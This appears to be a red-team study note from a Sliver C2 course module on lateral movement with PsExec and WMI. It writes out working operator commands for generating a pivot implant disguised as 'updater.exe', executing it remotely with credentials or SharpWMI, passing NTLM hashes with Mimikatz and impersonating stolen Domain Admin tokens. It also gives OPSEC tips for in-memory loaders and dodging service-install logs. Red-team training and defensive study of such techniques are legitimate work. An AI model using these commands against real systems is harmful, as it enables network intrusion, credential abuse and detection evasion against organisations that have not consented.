---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.09 Sliver Lateral Movement PsExec WMI"
---

# 95.09 Sliver Lateral Movement PsExec WMI

## Introduction to Lateral Movement with Sliver

Once initial access is established and privileges are escalated on a local machine, the next phase of an engagement is Lateral Movement—expanding access across the network to compromise additional hosts, domain controllers, or critical infrastructure.

Sliver provides native tools to facilitate lateral movement using standard Windows protocols. By leveraging built-in features, operators can orchestrate remote execution without relying on noisy, standalone executables like the original Sysinternals `psexec.exe`.

The two primary vectors natively integrated into Sliver are **PsExec (Service Control Manager)** and **WMI (Windows Management Instrumentation)**.

## Lateral Movement Architecture

Below is an ASCII representation of the lateral movement flow using Sliver's peer-to-peer (P2P) features combined with remote execution.

```text
    [ Operator / Sliver Server ]
                 |
                 | MTLS / WireGuard
                 v
+------------------------------------+
|  Compromised Host A (Sliver Node)  |  <-- Pivot / Jump Host
|  (IP: 10.0.0.50)                   |
|                                    |
|  [ Named Pipe Listener Active ]    |
+------------------------------------+
                 |
                 | SMB (Port 445) / DCOM (Port 135)
                 | PsExec / WMI Command Execution
                 v
+------------------------------------+
|  Target Host B (Lateral Move)      |
|  (IP: 10.0.0.100)                  |
|                                    |
| 1. Authenticate (Pass-the-Hash /   |
|    Kerberos Ticket)                |
| 2. Upload/Drop Payload (Admin$)    |
| 3. Execute via Service/WMI         |
| 4. Connect back to Host A via P2P  |
+------------------------------------+
                 |
                 | SMB Named Pipe Communication
                 v
+------------------------------------+
|   Target Host B (New Sliver Node)  |
|   Routed through Host A            |
+------------------------------------+
```

## Executing Lateral Movement

To perform lateral movement, you must have administrative privileges over the remote target. This usually implies possessing an appropriate NTLM hash, a Kerberos Ticket, or running in the context of a privileged user (via token impersonation).

### Preparation: Creating a Peer-to-Peer Payload
When moving laterally into restricted network segments, the target might not have internet access to reach the C2 server directly. Thus, creating an SMB Named Pipe or TCP pivot payload is recommended.

1. **Start a Named Pipe Listener on Host A (the current implant):**
```bash
sliver (IMPLANT_A) > pivot tcp --bind 10.0.0.50:4444
[*] TCP pivot listener started on 10.0.0.50:4444
```

2. **Generate the Pivot Payload:**
```bash
sliver > generate --tcp 10.0.0.50:4444 --arch amd64 --os windows --format exe --save /tmp/pivot.exe
```

3. **Upload the Payload to the Implant:**
```bash
sliver (IMPLANT_A) > upload /tmp/pivot.exe C:\Windows\Temp\updater.exe
```

### Method 1: PsExec (Service Control Manager)
The PsExec method involves authenticating via SMB, copying a service executable to a hidden share (like `ADMIN$`), and using the remote Service Control Manager (SCM) to create and start a Windows service that executes the payload.

Sliver implements a native `psexec` command that handles this interaction seamlessly.

```bash
# Basic native PsExec usage in Sliver
sliver (IMPLANT_A) > psexec -d target.local -u Administrator -p Password123! -t 10.0.0.100 -s C:\Windows\Temp\updater.exe
```
*Note: This requires dropping a binary to disk and creating a service, which generates Event ID 7045 (A new service was installed). This is a known IOC and heavily monitored.*

### Method 2: WMI (Windows Management Instrumentation)
WMI is generally stealthier than PsExec because it executes commands via the `Wmiprvse.exe` process without the need to create new Windows services. It relies on RPC and DCOM.

To execute the payload via WMI from the current implant:
```bash
sliver (IMPLANT_A) > execute-assembly /opt/tools/SharpWMI.exe action=execute computername=10.0.0.100 command="C:\Windows\Temp\updater.exe"
```
*(While Sliver doesn't have a single-word built-in WMI command like Cobalt Strike, operators heavily utilize Armory extensions like `SharpWMI` or WMI BOFs to achieve this via the `execute-assembly` or `bof` commands).*

## Pass-the-Hash and Token Impersonation

If you do not have plaintext credentials, you can use Pass-the-Hash (PtH) or Token Impersonation to authenticate to the remote host.

**Using Mimikatz for PtH:**
```bash
# Inject the hash into the current session to create a new logon session
sliver (IMPLANT_A) > mimikatz "sekurlsa::pth /user:Administrator /domain:target.local /ntlm:88e4d9faba0553... /run:cmd.exe"
```

**Token Impersonation:**
If a Domain Admin is logged into the current machine, you can steal their token to authorize the lateral movement.
```bash
# List tokens
sliver (IMPLANT_A) > tokens
# Impersonate
sliver (IMPLANT_A) > impersonate 1234
# Now any remote command (PsExec/WMI/SMB) executes as the Domain Admin
```

## OPSEC and Avoiding Detection

1. **Avoid Dropping Files:** Instead of copying `updater.exe` via SMB, use WMI to execute a PowerShell one-liner that downloads a Sliver stager shellcode directly into memory.
2. **Event Logs:** Be aware that WMI execution generates specific trace logs, and PsExec creates service logs (Event ID 7045). 
3. **P2P Traffic:** Use SMB Named Pipes (`pivot named-pipe`) for P2P communication, as it blends in with normal internal Windows network traffic better than raw TCP binds.

## Real-World Attack Scenario

### Pivoting through a Segmented DMZ
During a Red Team engagement, the operator compromises a web server in the DMZ. The objective is the internal domain controller, but the firewall blocks all outbound traffic from the internal network to the internet.

1. The operator dumps credentials on the web server and finds an over-privileged service account hash.
2. The operator starts an SMB Named Pipe pivot listener on the web server implant.
3. The operator creates a Sliver shellcode payload configured to connect to the Named Pipe.
4. Using an Armory BOF for WMI (`WmiExec-BOF`), the operator performs a Pass-the-Hash attack, passing the NTLM hash.
5. The WMI command executes a stealthy PowerShell loader on the internal domain controller.
6. The PowerShell loader injects the shellcode into memory.
7. The payload executes and connects back to the web server via SMB Port 445.
8. The web server routes the domain controller's traffic out to the C2 server.
9. The operator has successfully bypassed the firewall restrictions via lateral movement and P2P chaining, completely avoiding disk-based signatures on the domain controller.

## Chaining Opportunities

- **Armory BOFs:** Chain with BOFs (see [[10 - Integrating BOFs Beacon Object Files in Sliver]]) to execute WMI commands without needing the .NET CLR.
- **Evasion Tactics:** Combine with PPID spoofing (see [[08 - Evasion Techniques in Sliver Process Hollowing BlockDLLs]]) when executing tools locally to initiate the lateral movement.
- **Pivot Profiles:** Create advanced MTLS and SMB combined profiles for deep network pivoting.

## Related Notes

- [[05 - Sliver Session Management and Post-Exploitation]]
- [[07 - Sliver Armory Installing Custom Extensions]]
- [[08 - Evasion Techniques in Sliver Process Hollowing BlockDLLs]]
- [[10 - Integrating BOFs Beacon Object Files in Sliver]]
- [[14 - Advanced Pass-the-Hash and Kerberos Attacks]]
